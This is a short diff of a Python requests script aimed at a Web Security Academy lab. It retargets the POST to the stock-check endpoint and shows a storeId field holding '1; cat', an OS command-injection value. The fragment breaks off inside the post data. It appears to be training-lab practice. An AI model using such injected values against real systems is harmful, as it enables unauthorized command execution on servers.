@@ -2,7 +2,7 @@
 import requests
 
 s = requests.Session()
-stock_post_url = 'https://0af3007c04c085c5833506280005006b.web-security-academy.net/product?productId=1'
+stock_post_url = 'https://0a120031045a504d83abc4b700f0008c.web-security-academy.net/product/stock'
 post_data = {
     'productId' : '1',
     'storeId' : '1; cat'
